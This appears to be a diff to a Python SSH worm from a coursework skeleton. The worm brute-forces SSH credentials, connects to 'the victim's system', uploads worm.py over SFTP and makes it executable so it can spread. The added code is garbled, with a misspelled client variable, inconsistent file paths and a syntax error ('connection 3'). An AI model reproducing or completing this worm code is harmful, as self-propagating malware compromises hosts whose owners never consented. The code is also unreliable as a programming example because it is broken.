@@ -63,6 +63,7 @@ def spreadAndExecute(sshClient):
     
         sftpClient = sshClient.open_sftp()
 	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
+	stfpClient.chmod("/temp/worm.py", 0777)
 	sshClient.exec_command("chmod a+x /tmp/worm/py")
     
    # ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -109,19 +110,22 @@ def tryCredentials(host, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
+	
+	connection = 1
  
         print("Try to connect to host host using username and password")
     	try:
              sshClient.connect(host, userName, password)
              print("Opened a connectin to the victim's system!")
-             sftpClient = sshClient.open_sftp
-	     return 0
+             connection = 0
         except paramiko.SSHException:
              print("Wrong credentials :(")
-             return 1
+             connection = 1
         except socket.error:
              print("Server is down or has some other problem")
-             return 3
+             connection 3
+		
+	return connection
 
 ###############################################################
 # Wages a dictionary attack against the host
@@ -191,7 +195,7 @@ def getMyIP(interface):
                     # Save the IP addrss and break
                     ipAddr = addr
                     break
-            
+        print("Current IP of the current system" + ipAddr)
 	return ipAddr
 
 #######################################################
